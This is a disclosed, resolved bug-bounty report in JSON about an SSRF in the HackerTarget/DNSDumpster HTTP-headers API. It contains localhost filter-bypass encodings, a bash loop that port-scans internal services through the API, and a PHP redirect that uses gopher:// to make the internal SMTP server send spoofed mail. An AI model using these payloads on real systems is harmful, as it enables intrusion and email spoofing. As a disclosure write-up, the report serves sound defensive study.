{
  "id": 392859,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTI4NTk=",
  "url": "https://hackerone.com/reports/392859",
  "title": "Sending Emails from  DNSDumpster - Server-Side Request Forgery to Internal SMTP Access",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-11-17T19:18:17.000Z",
  "submitted_at": "2017-11-17T19:18:17.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cdl",
    "url": "/cdl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 31821,
    "url": "https://hackerone.com/hackertarget",
    "handle": "hackertarget",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "profile": {
      "name": "Hacker Target",
      "twitter_handle": "",
      "website": "https://hackertarget.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": true,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-08-10T21:40:02.757Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "\n| Summary: |\n| -- |\n[HackerTarget](https://hackertarget.com/) is a service that provides access to online vulnerability scanners and tools used by many security professionals and “makes securing your systems easier”. They also are the creators of [DNSDumpster](https://dnsdumpster.com/) which is a popular service used for recon.\n\n| Description: |\n| --|\n> Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request **is not** a vulnerability in itself, but it \n becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.\n\nIn [DNSDumpster](https://dnsdumpster.com/), there is a function to \"Get HTTP Headers\" for a specific host.  \n\n{F331105}\n\nThis function makes a call to the API at `https://api.hackertarget.com/httpheaders/?q=<target>` and it displays the HTTP Headers of a simple **HEAD** request sent from HackerTarget to the target server.\n\nThe `?q=` parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.\n\n| Proof-of-Concepts |\n| -- | \n\n# Initial Proof-of-Concept:\nMy initial proof-of-concept was extremely bland and I didn't put very much effort into it:\n\n- `https://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22`\n\n{F331111}\n\n\nThey thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string \"127.0.0.1\" and \"localhost\", which was easily bypassed using different encodings that would still resolve to localhost.\n\nExamples :\n\n```\n0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n```\n\nThere isn’t a solid way to validate hostnames just by using *string-based* checks, so my suggested mitigation was to resolve all hosts provided in the `?q=` parameter  and check them against local IP ranges.\n\n\nAbout a week and a half later:\n\n >  “It is on my todo list. Not critical though as there are no local services that could be hit with it.”\n\n\n# Proof of Concept: Hitting Local Services.\nI attempted to enumerate different ports that internal services could be running on, even though there were none \"that could be hit with it.\"\n\n```\n#!/usr/bin/env bash\nfor port in `seq 1 9999`\ndo\n\techo -e \"\\n\\n[+] Checking Port: \"$port\"\\n\"\n\tcurl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port && echo -e \"\\n\"\ndone\n```\n\n```\n➜ cdl@skid   ~ chmod +x ht.sh && ./ht.sh 0177.1\n```\n\nThis spat out the following response: \n\n{F331112}\n\nThere was an internal SMTP server running on the standard port.\n\n**SMTP:**\n-   SMTP stands for Simple Mail Transfer Protocol.\n-  It is a TCP/IP protocol that’s used for **sending emails**.\n\nIn order to be able to send emails with SMTP we have to first have to know how mail transactions work:\n\n1. SMTP sessions are initiated after the **client** opens a TCP/IP connection to the server and the **server** responds with a greeting (220)\n2. The **client** sends a `HELO` or `EHLO` with the clients identity (example: `HELO hackertarget.com` which means \"Hi I'm hackertarget.com\")\n3. Now the client has to perform 3 steps each separated by a **CRLF** for a valid SMTP mail transaction:\n    - Step 1: `MAIL`: This tells the server \"Hey, we're starting a new email, reset your state\". This is where the email \"from\" is specified.\n    - Step 2: `RCPT`: Tells the server where (who) we want to send the email too.\n    - Step 3: `DATA`: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only \".\". This tells the server that the client confirms the email and tells the server to process it and send it.\n\n   \nHere's a visualization of the structure of SMTP from [RFC 5321](https://tools.ietf.org/html/rfc5321):\n\n```\n                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |<-->|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |<-------------->|    SMTP  |    +------+\n      | File |<-->|          |    and Mail    |          |<-->| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n```\n\nThe SMTP Client was the \"Get HTTP Headers\" function of the API and the the SMTP Server was the service running on an internal port.\n\n\n# Leveraging the SSRF to send emails:\nThe API function was using libcurl to execute the requests *and* it was following redirects. The libcurl library supports an overabundance of protocols including `gopher://` which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.\n\n\n\n- http://<server>/mail.php:\n\n```\n<?php\n        $commands = array(\n                'HELO hackertarget.com',\n                'MAIL FROM: <admin@hackertarget.com>',\n                'RCPT To: <cdl@oou.us>',\n                'DATA',\n                'Subject: corben!',\n                'Corben (cdl) was here, woot woot!',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n?>\n```\n\nThis responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.\n\n\nI confirmed it worked by visiting the following URL:\n- https://api.hackertarget.com/httpheaders/?q=http://<server>/mail.php \n\nI checked my email (cdl@oou.us) and I had an email from `admin@hackertarget.com` with the subject \"corben!\" and the body \"Corben (cdl) was here, woot woot!\"\n\nHere's the proof-of-concept video:\n- https://www.youtube.com/watch?v=F_sC_OrSkIc\n\n\n| Impact | \n|--| \nAn attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.\n\n\n\nThanks,\nCorben Leo (@cdl)\n- https://hacking.us.com\n- https://twitter.com/hacker_",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 331105,
      "file_name": "ht-httpheaders.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?response-content-disposition=attachment%3B%20filename%3D%22ht-httpheaders.png%22%3B%20filename%2A%3DUTF-8%27%27ht-httpheaders.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DOTL4Z4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130913Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCP1h%2BMnyvDRDa6h%2F4zIodqh2MzJlGISvpnoEvR4kc2fgIgP8fAE6zkU2xDXiIdq36r00FCUyYf6OQc2MuvlpSL6zgqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDJ2sbhPrB5o6p2UkMiqPBcMZAZzMf1lo6ftFZmyVLqm8Hg2J3xbj6a3GuTLabMbNJWiA%2FZsFo0hE3gxRPbyAqhG6FJuKINNLYiqNvOekzW8sar88psZuM%2FX9%2FNoLvFSAVVJpHHBKNZUcwzDsSG6dL68X0%2F81p9YWjmvjokQY%2B9nuD7359WQ659K26Fclw65VMeRybJ1hUyi2a%2FyS4P%2FH0PoUc1H0vEsvCcDRZFSU2VqX6BFziwRAbmxLuUXTN5m%2F5hWF5b3%2BkgFf3EOVPo%2BXtyBL0zsVvefLcDnkTyLYtjGuMSoKMfdzhMUUnoy%2FSkL%2FnqSrrhe9QDnvuA12WJYXs7dXUtOgD1FweSHqkAlJgnKNM8PYSjJnvj8q9w4J7BBdDstdMKFug3p2hl8P0Z3ewTKwgYQFTrJSgQ5k2oIl05GLUuZEuGlOhqiAdJ0VSwCyoN%2BcsLtWKUwcF5i%2BGCo6ppjPFD80qdzVR70b4ApfmQxVQXMoqtkj6LQcYtZ%2BagRqhM%2BtszUfSlLJd2TtHW1cmvfHpY38mbjTqSHEOfCoz%2FpdesWuHOFHT%2FPgVGOwrKnQpNMV%2FyR1KqF%2B%2F4CD%2FGMR2tktKBwuNfh2OlxQvwD2aE8XvEC%2B4mc3056ID7XSvkKVVQ5FPigZOQTgvmJ494qVF7ehsKzqTF%2B9hAoK4S6zfV7Rj7ZQPgHv3om4hYuHsgUcaD29IgjjBb7uAyiaX%2BnWynmxhoDSjS8R%2BX%2Fh548W%2F5oeVorlsLKwzmcY%2Fn5eCd84hK21TQBO83%2FN5WvC2Rjqcrcse3ypMcrNI7pSoyAYBbW7BZ7x1FSQkjJ0k9%2BmmuCWHGFTK1yvtjTnkqMZorU8FXNTbF9f5hhpv%2FD%2Bx%2FaaWxL40nM7EEpqTFiYBitKsZow7cCtrgY6sQExtT%2FZOBwnOUsXGGVn22KELl38mJ%2B5OivmNc%2Fgks2i4L3ET0mxTFvDVZpjL316NVv%2FbrIj%2Fy2VtfGofe3Raptm7CsozbMN%2FwB4%2F%2B1rcHUIoVQ8JJTc06nsi5aVYzNhXnbrwhbQkoT0dxKYDFETL%2B6%2F051XAavIrnvB5CtHwa5YaT7z83h5GNqUOlmAh9%2BiDFNSkfEsNFaYzGytNE8syYguoEi7iDkqQjn2z2qwL4LrkcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e8250365a765f801b1cca2ec3cb2b86b88eb97b014309445bc0bd543c3a3d75b",
      "file_size": 13649,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 331111,
      "file_name": "ht-ssh.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?response-content-disposition=attachment%3B%20filename%3D%22ht-ssh.png%22%3B%20filename%2A%3DUTF-8%27%27ht-ssh.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DOTL4Z4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130913Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCP1h%2BMnyvDRDa6h%2F4zIodqh2MzJlGISvpnoEvR4kc2fgIgP8fAE6zkU2xDXiIdq36r00FCUyYf6OQc2MuvlpSL6zgqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDJ2sbhPrB5o6p2UkMiqPBcMZAZzMf1lo6ftFZmyVLqm8Hg2J3xbj6a3GuTLabMbNJWiA%2FZsFo0hE3gxRPbyAqhG6FJuKINNLYiqNvOekzW8sar88psZuM%2FX9%2FNoLvFSAVVJpHHBKNZUcwzDsSG6dL68X0%2F81p9YWjmvjokQY%2B9nuD7359WQ659K26Fclw65VMeRybJ1hUyi2a%2FyS4P%2FH0PoUc1H0vEsvCcDRZFSU2VqX6BFziwRAbmxLuUXTN5m%2F5hWF5b3%2BkgFf3EOVPo%2BXtyBL0zsVvefLcDnkTyLYtjGuMSoKMfdzhMUUnoy%2FSkL%2FnqSrrhe9QDnvuA12WJYXs7dXUtOgD1FweSHqkAlJgnKNM8PYSjJnvj8q9w4J7BBdDstdMKFug3p2hl8P0Z3ewTKwgYQFTrJSgQ5k2oIl05GLUuZEuGlOhqiAdJ0VSwCyoN%2BcsLtWKUwcF5i%2BGCo6ppjPFD80qdzVR70b4ApfmQxVQXMoqtkj6LQcYtZ%2BagRqhM%2BtszUfSlLJd2TtHW1cmvfHpY38mbjTqSHEOfCoz%2FpdesWuHOFHT%2FPgVGOwrKnQpNMV%2FyR1KqF%2B%2F4CD%2FGMR2tktKBwuNfh2OlxQvwD2aE8XvEC%2B4mc3056ID7XSvkKVVQ5FPigZOQTgvmJ494qVF7ehsKzqTF%2B9hAoK4S6zfV7Rj7ZQPgHv3om4hYuHsgUcaD29IgjjBb7uAyiaX%2BnWynmxhoDSjS8R%2BX%2Fh548W%2F5oeVorlsLKwzmcY%2Fn5eCd84hK21TQBO83%2FN5WvC2Rjqcrcse3ypMcrNI7pSoyAYBbW7BZ7x1FSQkjJ0k9%2BmmuCWHGFTK1yvtjTnkqMZorU8FXNTbF9f5hhpv%2FD%2Bx%2FaaWxL40nM7EEpqTFiYBitKsZow7cCtrgY6sQExtT%2FZOBwnOUsXGGVn22KELl38mJ%2B5OivmNc%2Fgks2i4L3ET0mxTFvDVZpjL316NVv%2FbrIj%2Fy2VtfGofe3Raptm7CsozbMN%2FwB4%2F%2B1rcHUIoVQ8JJTc06nsi5aVYzNhXnbrwhbQkoT0dxKYDFETL%2B6%2F051XAavIrnvB5CtHwa5YaT7z83h5GNqUOlmAh9%2BiDFNSkfEsNFaYzGytNE8syYguoEi7iDkqQjn2z2qwL4LrkcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fe0b57b5594b7e23129b9aa281c406b0ec18d9d9decb85b0c180e6489b429469",
      "file_size": 38020,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 331112,
      "file_name": "ht-postfix.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?response-content-disposition=attachment%3B%20filename%3D%22ht-postfix.png%22%3B%20filename%2A%3DUTF-8%27%27ht-postfix.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DOTL4Z4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130913Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCP1h%2BMnyvDRDa6h%2F4zIodqh2MzJlGISvpnoEvR4kc2fgIgP8fAE6zkU2xDXiIdq36r00FCUyYf6OQc2MuvlpSL6zgqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDJ2sbhPrB5o6p2UkMiqPBcMZAZzMf1lo6ftFZmyVLqm8Hg2J3xbj6a3GuTLabMbNJWiA%2FZsFo0hE3gxRPbyAqhG6FJuKINNLYiqNvOekzW8sar88psZuM%2FX9%2FNoLvFSAVVJpHHBKNZUcwzDsSG6dL68X0%2F81p9YWjmvjokQY%2B9nuD7359WQ659K26Fclw65VMeRybJ1hUyi2a%2FyS4P%2FH0PoUc1H0vEsvCcDRZFSU2VqX6BFziwRAbmxLuUXTN5m%2F5hWF5b3%2BkgFf3EOVPo%2BXtyBL0zsVvefLcDnkTyLYtjGuMSoKMfdzhMUUnoy%2FSkL%2FnqSrrhe9QDnvuA12WJYXs7dXUtOgD1FweSHqkAlJgnKNM8PYSjJnvj8q9w4J7BBdDstdMKFug3p2hl8P0Z3ewTKwgYQFTrJSgQ5k2oIl05GLUuZEuGlOhqiAdJ0VSwCyoN%2BcsLtWKUwcF5i%2BGCo6ppjPFD80qdzVR70b4ApfmQxVQXMoqtkj6LQcYtZ%2BagRqhM%2BtszUfSlLJd2TtHW1cmvfHpY38mbjTqSHEOfCoz%2FpdesWuHOFHT%2FPgVGOwrKnQpNMV%2FyR1KqF%2B%2F4CD%2FGMR2tktKBwuNfh2OlxQvwD2aE8XvEC%2B4mc3056ID7XSvkKVVQ5FPigZOQTgvmJ494qVF7ehsKzqTF%2B9hAoK4S6zfV7Rj7ZQPgHv3om4hYuHsgUcaD29IgjjBb7uAyiaX%2BnWynmxhoDSjS8R%2BX%2Fh548W%2F5oeVorlsLKwzmcY%2Fn5eCd84hK21TQBO83%2FN5WvC2Rjqcrcse3ypMcrNI7pSoyAYBbW7BZ7x1FSQkjJ0k9%2BmmuCWHGFTK1yvtjTnkqMZorU8FXNTbF9f5hhpv%2FD%2Bx%2FaaWxL40nM7EEpqTFiYBitKsZow7cCtrgY6sQExtT%2FZOBwnOUsXGGVn22KELl38mJ%2B5OivmNc%2Fgks2i4L3ET0mxTFvDVZpjL316NVv%2FbrIj%2Fy2VtfGofe3Raptm7CsozbMN%2FwB4%2F%2B1rcHUIoVQ8JJTc06nsi5aVYzNhXnbrwhbQkoT0dxKYDFETL%2B6%2F051XAavIrnvB5CtHwa5YaT7z83h5GNqUOlmAh9%2BiDFNSkfEsNFaYzGytNE8syYguoEi7iDkqQjn2z2qwL4LrkcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=59de194735eccbf77fd1337033f9744f6c8be079534834ebc9722c3a72059370",
      "file_size": 40915,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 69,
  "voters": [
    "barbie_girl",
    "dyuen",
    "pudsec",
    "pomme",
    "cdl",
    "kapytein",
    "jobert",
    "michiel",
    "sameerphad72",
    "supr4s",
    "and 59 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.6,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 9756,
      "category": "researcher",
      "content": "This is a write-up of an SSRF I accidentally found in DNS Dumpster / HackerTarget and leveraged to access to internal services. They **do not**  have a bug bounty program, **do not** test them without their permission. Originally blogged about this here: https://hacking.us.com/blog/hackertarget ",
      "user": {
        "id": 114524,
        "username": "cdl",
        "name": "Corben Leo",
        "bio": "",
        "cleared": true,
        "verified": true,
        "website": "https://hacking.us.com",
        "location": "South Dakota",
        "created_at": "2016-09-29T14:44:35.410Z",
        "url": "https://hackerone.com/cdl",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
